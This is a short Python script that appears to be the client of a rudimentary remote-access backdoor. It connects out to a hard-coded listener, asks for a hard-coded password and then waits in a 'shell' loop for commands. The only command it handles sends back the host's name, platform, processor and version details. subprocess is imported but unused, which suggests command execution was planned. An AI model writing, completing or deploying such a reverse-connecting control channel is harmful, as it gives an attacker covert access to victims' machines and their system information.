import socket 
import os
import platform
import getpass
import subprocess
import sys

def systeminfo():
    return(platform.machine(), platform.node(), platform.platform(), platform.processor(), platform.release(), platform.system(), platform.version())

host = '127.0.0.1'
port = 3333

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

auth_try = 0

def auth():
    global auth_try
    if auth_try == 5:
        sys.exit()

    password = '1111'
    s.send(b'Password:')

    enter = s.recv(1024)
    enter = enter.decode()

    if enter == password:
        s.send(b'ok')
        shell()
    else:
        s.send(b'no')
        auth_try = auth_try + 1
        auth()


def shell():
    while True:
        command = s.recv(1024)
        command = command.decode()

        if command == 'system':
            sysinfo = systeminfo()
            sysinfo = str(sysinfo)
            s.send(sysinfo.encode())

auth()